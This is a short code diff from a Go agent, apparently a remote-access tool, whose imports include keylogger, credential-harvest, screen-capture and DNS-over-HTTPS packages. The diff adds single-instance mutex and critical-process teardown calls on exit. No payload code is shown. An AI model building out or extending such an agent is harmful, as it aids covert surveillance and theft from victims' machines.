@@ -22,11 +22,13 @@ import (
 	"overlord-client/cmd/agent/activewindow"
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/config"
+	"overlord-client/cmd/agent/criticalproc"
 	"overlord-client/cmd/agent/doh"
 	"overlord-client/cmd/agent/handlers"
 	"overlord-client/cmd/agent/harvest"
 	"overlord-client/cmd/agent/internal/overlordenv"
 	"overlord-client/cmd/agent/keylogger"
+	"overlord-client/cmd/agent/mutex"
 	"overlord-client/cmd/agent/plugins"
 	rt "overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/sysinfo"
@@ -163,6 +165,8 @@ func runClient(cfg config.Config) {
 			if isSupersededError(err) {
 				log.Printf("session superseded by a newer connection; exiting")
 				handleSuperseded(cfg)
+				mutex.ReleaseGlobal()
+				criticalproc.Teardown()
 				exitProcess(0)
 				return
 			}
